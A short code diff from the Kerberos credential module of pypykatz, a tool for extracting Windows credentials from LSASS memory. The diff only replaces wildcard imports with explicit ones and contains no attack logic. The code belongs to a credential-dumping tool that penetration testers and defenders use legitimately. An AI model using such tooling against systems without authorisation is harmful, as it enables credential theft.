@@ -5,11 +5,13 @@
 #
 import io
 
-from pypykatz.commons.common import *
-from pypykatz.commons.filetime import *
-from pypykatz.commons.kerberosticket import *
-from .templates import *
-from pypykatz.lsadecryptor.package_commons import *
+#from pypykatz.commons.common import *
+#from pypykatz.commons.filetime import *
+#from .templates import *
+from pypykatz.commons.kerberosticket import KerberosTicket, KerberosTicketType
+from pypykatz.lsadecryptor.package_commons import PackageDecryptor
+from pypykatz.commons.win_datatypes import PLIST_ENTRY, PRTL_AVL_TABLE
+from pypykatz.commons.common import WindowsMinBuild
 
 class KerberosCredential:
 	def __init__(self):
